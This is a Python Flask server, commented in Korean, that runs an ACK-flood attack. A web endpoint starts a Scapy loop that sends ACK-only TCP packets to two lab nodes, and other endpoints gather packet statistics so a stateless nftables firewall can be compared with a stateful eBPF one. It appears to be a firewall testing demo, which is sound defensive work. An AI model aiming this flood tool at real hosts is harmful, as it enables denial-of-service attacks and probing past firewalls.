#!/usr/bin/env python3
"""
ACK Flood Attack Server
- Web UI 대시보드 제공
- Scapy로 ACK-only 패킷을 두 노드에 동시 발송
- 피해 노드 REST API 집계
- 정상 손님 클라이언트 API 집계 (비교용)
"""

import os
import sys
import threading
import random
import time
import logging
import requests
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

try:
    from scapy.all import IP, TCP, send as scapy_send, conf as scapy_conf
    scapy_conf.verb = 0
except ImportError:
    print("ERROR: pip install scapy", file=sys.stderr)
    sys.exit(1)

# ── 설정 ──────────────────────────────────────────────────────────────────────
# 실제 IP 값 (Quadlet environment / Ansible에서 주입)
NODE1_IP      = os.environ.get('NODE1_IP',      '192.168.100.7')  # stateless 컨테이너
NODE2_IP      = os.environ.get('NODE2_IP',      '192.168.100.8')  # stateful 컨테이너
NODE1_API     = os.environ.get('NODE1_API',     f'http://{os.environ.get("NODE1_IP","192.168.100.7")}:9090')
NODE2_API     = os.environ.get('NODE2_API',     f'http://{os.environ.get("NODE2_IP","192.168.100.8")}:9090')
GUEST_API     = os.environ.get('GUEST_API',     'http://192.168.100.6:7070')
TARGET_PORT   = int(os.environ.get('TARGET_PORT',   '8080'))
WEB_PORT      = int(os.environ.get('WEB_PORT',      '8000'))

# 환경변수 재계산 (NODE_IP 와 API URL 이 따로 설정될 수 있음)
NODE1_API = os.environ.get('NODE1_API', f'http://{NODE1_IP}:9090')
NODE2_API = os.environ.get('NODE2_API', f'http://{NODE2_IP}:9090')

NODES = {
    'node1': {'label': 'Node 1 — Stateless (nftables)', 'ip': NODE1_IP, 'api': NODE1_API, 'fw': 'stateless'},
    'node2': {'label': 'Node 2 — Stateful (zfw eBPF)',  'ip': NODE2_IP, 'api': NODE2_API, 'fw': 'stateful'},
}

# ── 공격 상태 ─────────────────────────────────────────────────────────────────
_attack_state = {
    'running':    False,
    'start_time': None,
    'duration':   0.0,
    'count':      0,
    'rate':       10.0,
    'sent':       0,
    'port':       TARGET_PORT,
    'targets':    [NODE1_IP, NODE2_IP],
}
_state_lock    = threading.Lock()
_attack_thread = None


def _send_loop(targets, port, count, duration, rate):
    start    = time.time()
    sent     = 0
    interval = (1.0 / rate) if rate > 0 else 0.001

    while True:
        with _state_lock:
            if not _attack_state['running']:
                break
        if duration > 0 and (time.time() - start) >= duration:
            break
        if 0 < count <= sent:
            break

        src_port = random.randint(1024, 65535)
        seq      = random.randint(0, 0xFFFFFFFF)
        ack_num  = random.randint(0, 0xFFFFFFFF)

        threads = []
        for tgt in targets:
            pkt = IP(dst=tgt) / TCP(
                sport=src_port,
                dport=port,
                flags='A',       # ACK only — SYN 없음
                seq=seq,
                ack=ack_num,
                window=8192,
            )
            t = threading.Thread(
                target=scapy_send, args=(pkt,),
                kwargs={'verbose': False}, daemon=True
            )
            threads.append(t)

        for t in threads: t.start()
        for t in threads: t.join(timeout=1.0)

        sent += len(targets)
        with _state_lock:
            _attack_state['sent'] = sent

        if interval > 0:
            time.sleep(interval)

    with _state_lock:
        _attack_state['running'] = False
        _attack_state['sent']    = sent

    logging.getLogger('attack').info(f"공격 완료: {sent}개 발송")


# ── Flask ─────────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder='static')
CORS(app)


@app.route('/')
def index():
    return send_from_directory('static', 'index.html')


# ── 공격 제어 ──────────────────────────────────────────────────────────────────
@app.route('/api/attack', methods=['POST'])
def start_attack():
    global _attack_thread
    body = request.get_json(silent=True) or {}

    with _state_lock:
        if _attack_state['running']:
            return jsonify({'error': '이미 공격 중'}), 409

        targets  = body.get('targets',  [NODE1_IP, NODE2_IP])
        port     = int(body.get('port',     TARGET_PORT))
        duration = float(body.get('duration',  30.0))
        count    = int(body.get('count',        0))
        rate     = float(body.get('rate',       10.0))

        _attack_state.update({
            'running':    True,
            'start_time': time.time(),
            'duration':   duration,
            'count':      count,
            'rate':       rate,
            'sent':       0,
            'port':       port,
            'targets':    targets,
        })

    _attack_thread = threading.Thread(
        target=_send_loop,
        args=(targets, port, count, duration, rate),
        daemon=True,
    )
    _attack_thread.start()
    return jsonify({'status': 'started', 'targets': targets, 'port': port})


@app.route('/api/attack', methods=['DELETE'])
def stop_attack():
    with _state_lock:
        _attack_state['running'] = False
    return jsonify({'status': 'stopped'})


@app.route('/api/attack/status')
def attack_status():
    with _state_lock:
        st = dict(_attack_state)
    st['elapsed'] = (time.time() - st['start_time']) if st['start_time'] else 0.0
    return jsonify(st)


# ── 노드 / 손님 모니터링 ───────────────────────────────────────────────────────
@app.route('/api/nodes')
def nodes_status():
    result = {}
    for nid, cfg in NODES.items():
        try:
            sr = requests.get(f"{cfg['api']}/api/stats",            timeout=2)
            pr = requests.get(f"{cfg['api']}/api/packets?limit=30", timeout=2)
            st = sr.json()
            result[nid] = {
                'label':   cfg['label'],
                'ip':      cfg['ip'],
                'fw_type': cfg['fw'],
                'online':  True,
                'stats':   st,
                'packets': pr.json(),
                'breached': st.get('ack_only', 0) > 0,
            }
        except Exception as exc:
            result[nid] = {
                'label': cfg['label'], 'ip': cfg['ip'],
                'fw_type': cfg['fw'],  'online': False,
                'error': str(exc),     'stats': {},
                'packets': [],         'breached': False,
            }
    return jsonify(result)


@app.route('/api/nodes/<node_id>/packets')
def node_packets(node_id):
    if node_id not in NODES:
        return jsonify({'error': 'unknown node'}), 404
    cfg      = NODES[node_id]
    since_id = request.args.get('since_id', 0)
    try:
        r = requests.get(f"{cfg['api']}/api/packets?since_id={since_id}&limit=50", timeout=2)
        return jsonify(r.json())
    except Exception as exc:
        return jsonify({'error': str(exc)}), 503


@app.route('/api/guest')
def guest_status():
    """정상 손님 클라이언트 접속 결과 집계."""
    try:
        r = requests.get(f"{GUEST_API}/api/results?limit=20", timeout=2)
        return jsonify({'online': True, 'data': r.json()})
    except Exception as exc:
        return jsonify({'online': False, 'error': str(exc)})


@app.route('/api/config')
def get_config():
    return jsonify({
        'node1_ip':    NODE1_IP,
        'node2_ip':    NODE2_IP,
        'guest_api':   GUEST_API,
        'target_port': TARGET_PORT,
        'nodes': {k: {'label': v['label'], 'ip': v['ip'], 'fw_type': v['fw']}
                  for k, v in NODES.items()},
    })


# ── 메인 ───────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s | %(levelname)s | %(message)s',
        datefmt='%Y-%m-%dT%H:%M:%S',
    )
    logging.getLogger('werkzeug').setLevel(logging.WARNING)
    logger = logging.getLogger('attack')
    logger.info(f"Attack Server 시작: http://0.0.0.0:{WEB_PORT}")
    logger.info(f"  Node1 IPVLAN ({NODE1_IP}) API: {NODE1_API}")
    logger.info(f"  Node2 IPVLAN ({NODE2_IP}) API: {NODE2_API}")
    logger.info(f"  Guest Client API: {GUEST_API}")
    app.run(host='0.0.0.0', port=WEB_PORT, threaded=True)
